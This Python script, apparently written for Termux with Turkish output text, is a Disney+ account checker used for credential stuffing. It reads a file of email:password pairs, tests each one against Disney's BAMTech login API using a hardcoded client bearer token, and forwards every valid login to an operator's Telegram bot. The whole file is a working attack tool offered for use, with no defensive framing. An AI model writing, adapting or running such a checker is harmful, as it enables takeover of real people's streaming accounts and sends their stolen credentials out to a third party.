import os, requests, time, webbrowser
import os,random,time
os.system("pkg install espeak")
os.system("pkg install python-cfonts")
os.system("clear")







from os import system as _HERON_
def lo(word):
    heron = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(5):
        for x in range(len(heron)):
            sys.stdout.write(('\r{}{}').format(str(word), heron[x]))
            time.sleep(0.01)
            sys.stdout.flush()
lo(" \x1b[1;36m     Api İle Bağlantı Kuruluyor bekle aq")

os.system('clear')         
   
   

   
   
from cfonts import render            
output = render('DISNEY', colors=['white', 'blue'], align='center')
print(output)
print("~ Programmer : @Ulus | Channel: JED ~ ARCHIVE ~")
print("\x1b[1;39m—" * 60)



class DisneyAccountChecker:
    def __init__(self, token, chat_id, filename):
        self.token = token
        self.chat_id = chat_id
        self.filename = filename
        self.h = 0
        self.b = 0

    def read_file(self):
        with open(self.filename, 'r') as file:
            return file.readlines()

    def send_telegram_message(self, username, password):
        message = f"""
𓊆𝐴𝐶𝐶𝑂𝑈𝑁𝑇  𝐷𝐼𝑆𝑁𝐸𝑌𓊇
⋘─────━Valentia━─────⋙
 🇹🇷𝐄𝐌𝐀𝐈𝐋  :  {username}
 🇹🇷𝐒𝐈𝐅𝐑𝐄  :  {password}
 🇹🇷𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 : @Roox_00  ⋘─────━Valentia━─────⋙
"""
        requests.post(f'https://api.telegram.org/bot{self.token}/sendMessage?chat_id={self.chat_id}&text={message}')

    def check_account(self, username, password):
        session = requests.Session()
        data = '{"deviceFamily":"browser","applicationRuntime":"chrome","deviceProfile":"windows","attributes":{}}'
        headers = {
            'content-type': 'application/json',
            'accept': 'application/json; charset=utf-8',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9',
            'authorization': 'Bearer ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84',
            'cache-control': 'no-cache',
            'origin': 'https://www.disneyplus.com',
            'pragma': 'no-cache',
            'referer': 'https://www.disneyplus.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36',
            'x-bamsdk-client-id': 'disney-svod-3d9324fc',
            'x-bamsdk-platform': 'windows',
            'x-bamsdk-version': '4.16'
        }
        response = session.post('https://global.edge.bamgrid.com/devices', data=data, headers=headers).json()['assertion']
        url1 = 'https://global.edge.bamgrid.com/token'
        data1 = f'grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Atoken-exchange&latitude=0&longitude=0&platform=browser&subject_token={response}&subject_token_type=urn%3Abamtech%3Aparams%3Aoauth%3Atoken-type%3Adevice'
        headers1 = headers.copy()
        headers1['content-type'] = 'application/x-www-form-urlencoded'
        response2 = session.post(url1, data=data1, headers=headers1).json()['access_token']
        url2 = 'https://global.edge.bamgrid.com/idp/check'
        data2 = f'{{"email":"{username}"}}'
        headers2 = headers.copy()
        headers2['authorization'] = f'Bearer {response2}'
        response3 = session.post(url2, data=data2, headers=headers2).text

        if '"operations":["Login","OTP"]' in response3:
            url3 = 'https://global.edge.bamgrid.com/idp/login'
            data3 = f'{{"email":"{username}","password":"{password}"}}'
            response4 = session.post(url3, data=data3, headers=headers2)
            if 'id_token' in response4.text:
                print(f'\x1b[1;32m 𝐃𝐨𝐠𝐫𝐮 𝐡𝐞𝐬𝐚𝐩 ✅ :  - {username} : {password} | {self.h}')
                self.send_telegram_message(username, password)
                self.h += 1
            else:
                self.b += 1
                print(f'\x1b[1;33m𝐲𝐚𝐧𝐥ı𝐬 𝐡𝐞𝐬𝐚𝐩 ❌: {username} : {password} | {self.b}')
        else:
            self.b += 1
            print(f'\x1b[1;33m𝐲𝐚𝐧𝐥ı𝐬 𝐡𝐞𝐬𝐚𝐩 ❌:  {username} : {password} | {self.b}')

    def run(self):
        lines = self.read_file()
        for line in lines:
            line = line.strip()
            if line:
                username, password = line.split(':')
                self.check_account(username, password)

if __name__ == "__main__":
    
    
    E = '\033[1;31m'
    G = '\033[1;35m'
    Z = '\033[1;31m' 
    Q = '\033[1;36m'
    X = '\033[1;33m'  
    Z1 = '\033[2;31m'  
    F = '\033[2;32m' 
    A = '\033[2;34m'  
    C = '\033[2;35m'  
    B = '\x1b[38;5;208m'  
    Y = '\033[1;34m'  
    M = '\x1b[1;37m'  
    S = '\033[1;33m'
    U = '\x1b[1;37m'  
    
    
    token = input(f' {Q}({Q}1{Q}) {Q}  𝐓𝐨𝐤𝐞𝐧 𝐆𝐢𝐫𝐢𝐧𝐢𝐳 {F}:   ' + Z)
    print("\x1b[1;39m—" * 60)
    chat_id = input(f' {Q}({Q}2{Q}) {Q}  𝐈𝐃 𝐆𝐢𝐫𝐢𝐧𝐢𝐳 {F} :  ' + Z)
    print("\x1b[1;39m—" * 60)
    filename = input(f" {Q}({Q}3{Q}) {Q}  𝐃𝐨𝐬𝐲𝐚𝐲ı 𝐆𝐢𝐫𝐢𝐧𝐢𝐳 : ")
    print("\x1b[1;39m—" * 60)
    os.system('clear')

    checker = DisneyAccountChecker(token, chat_id, filename)
    checker.run()
    
    
    # @Roox_00
